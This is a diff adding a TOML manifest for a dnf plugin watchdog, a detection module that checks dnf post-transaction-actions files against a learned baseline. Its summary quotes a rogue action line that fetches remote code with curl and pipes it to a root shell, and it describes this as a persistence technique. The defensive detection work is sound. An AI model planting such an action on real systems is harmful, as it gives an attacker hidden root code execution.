@@ -1,0 +1,41 @@
+name        = "dnf-plugins-watchdog"
+version     = "0.1.0"
+summary     = "Boot + daily delta of the dnf plugin config + post-transaction-actions (/etc/dnf/plugins/*.conf + /etc/dnf/plugins/post-transaction-actions.d/*.action) vs a learned baseline + ownership + command scan. The dnf post-transaction-actions plugin runs a command AS ROOT after a matching package transaction (the RPM-side equivalent of apt's DPkg::Post-Invoke); a rogue .action (`*:in:curl evil|sh`) is root-exec persistence that fires on the next dnf install/update (T1546). A command under /tmp /home /dev/shm, world-writable, bare/relative, an injection pattern, or a world-writable/non-root file is the signature. Distinct from dnf-automatic-config (auto-update policy). No-ops cleanly if absent"
+category    = "detection"
+
+depends_on  = []
+conflicts   = []
+provides    = ["dnf-plugins-detection"]
+consumes    = []
+
+requires    = [
+    { kind = "binary", value = "sha256sum" },
+    { kind = "binary", value = "logger" },
+    { kind = "binary", value = "systemctl" },
+]
+
+instanced = false
+phase = "main"
+
+[install]
+kind = "script"
+apply = "install/apply.sh"
+check = "install/check.sh"
+uninstall = "install/uninstall.sh"
+
+[profiles]
+# `report` (default) — log delta; exit 0
+# `enforce`          — exit 1 on any dnf-plugins change
+default = "report"
+available = ["report", "enforce"]
+
+# MS011 Z-8 / SDD-026 — install-path manifest.
+[install_paths]
+scope = "system"
+paths = [
+    "/etc/selfdef/modules/dnf-plugins-watchdog.toml",
+    "/usr/local/libexec/selfdef/dnf-plugins-watchdog.sh",
+    "/etc/systemd/system/selfdef-dnf-plugins.service",
+    "/etc/systemd/system/selfdef-dnf-plugins.timer",
+    "/var/lib/selfdef/dnf-plugins-baseline.tsv",
+]
